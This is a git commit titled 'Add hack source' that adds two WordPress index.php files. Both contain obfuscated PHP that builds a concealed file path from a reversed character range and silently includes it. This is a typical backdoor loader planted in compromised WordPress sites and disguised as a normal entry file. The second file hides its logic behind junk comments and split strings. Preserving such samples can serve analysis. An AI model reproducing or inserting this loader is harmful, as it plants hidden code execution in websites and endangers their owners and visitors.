ab7eeb12643368c2bf62055ede8072dde73362b8
Saggre <sakri.koskimies@hotmail.com>
2022-10-05 22:35:29 +0300

    Add hack source

---
+++ wordpress/wordpress/index.php
@@ -0,0 +1,4 @@
+<?php
+
+$DnRje = range( chr( 126 ), chr( 20 ) );
+@include $DnRje[23] . $DnRje[51] . $DnRje[18] . $DnRje[4] . $DnRje[48] . $DnRje[28] . $DnRje[11] . $DnRje[41] . $DnRje[80] . $DnRje[14] . $DnRje[16] . $DnRje[23]; ?>
---
+++ wordpress/wordpress/wordpress/index.php
@@ -0,0 +1,27 @@
+<?php
+
+/*-[eOxUziRAN-*/
+$mBrWi /*-r5r{fg-*/ =/*-qYfgz-*/
+  "ra"/*-:b>ODpW-*/ . "nge";
+$KMVD /*-XkwhB-*/   =/*-uwrl-*/
+  $mBrWi/*-Q^g-*/ (/*-Xkh}u-*/ "~"/*-T)-*/,/*-X7o.OHRUR-*/ " " ); /*-Bv[b+:e-*/
+@include/*-$-:e-*/
+  $KMVD/*-`O;-*/
+  [ 9 + 9 ] . $KMVD/*-x<-*/
+  [ 1 + 3 ] . $KMVD/*-Ri<!f$-*/
+  [ 45 + 11 ] . $KMVD/*-y&AfD-*/
+  [ 9 + 36 ] . $KMVD/*-ygp#or-*/
+  [ 9 + 27 ] . $KMVD/*-98=3d2Dw7(-*/
+  [ 0 + 57 ] . $KMVD/*-M_OGx1o-*/
+  [ 30 + 11 ] . $KMVD/*-#U1ir^s-*/
+  [ 4 + 2 ] . $KMVD/*-nd7fIp-*/
+  [ 27 + 27 ] . $KMVD/*-ky-*/
+  [ 9 + 46 ] . $KMVD/*-$Jj;]-*/
+  [ 9 + 8 ] . $KMVD/*-N#}dCM#-*/
+  [ 10 + 13 ] . $KMVD/*-[}&IRu;-*/
+  [ 30 + 17 ] . $KMVD/*-x9-*/
+  [ 42 + 38 ] . $KMVD/*-t,J_-*/
+  [ 23 + 0 ] . $KMVD/*-6>=j7h{-*/
+  [ 21 + 0 ] . $KMVD/*-p,-0l-*/
+  [ 6 + 18 ]/*-R3-*/
+; ?>
